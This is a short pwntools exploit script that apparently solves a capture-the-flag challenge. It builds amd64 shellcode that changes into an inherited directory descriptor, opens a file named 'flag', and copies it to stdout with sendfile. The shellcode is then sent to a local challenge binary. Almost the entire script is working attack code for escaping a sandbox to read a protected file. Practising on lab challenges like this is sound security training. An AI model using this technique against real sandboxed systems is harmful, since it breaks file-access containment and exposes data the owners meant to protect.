from pwn import *

# set some context
context.arch = "amd64"
context.encoding = "latin"
# ignore warnings
warnings.simplefilter("ignore")

assembly = str()
# change directory to the fd referred by the first open(argv[1], ...)
assembly += shellcraft.fchdir(3)
# open() 'flag' relative to the changed directory
assembly += shellcraft.open("flag", 0)
# sendfile() that to stdout
assembly += shellcraft.sendfile(1, "rax", 0, 0x55)
# exit cleanly
assembly += shellcraft.amd64.linux.syscall("SYS_exit", 0)

# the hostname will always be the same as challenge binary
challenge_binary = os.getenv('HOSTNAME')
with process([f"/challenge/{challenge_binary}", "/"]) as target:
    info( target.readrepeat(1) )
    target.send( asm(assembly) )
    info( target.readrepeat(1) )
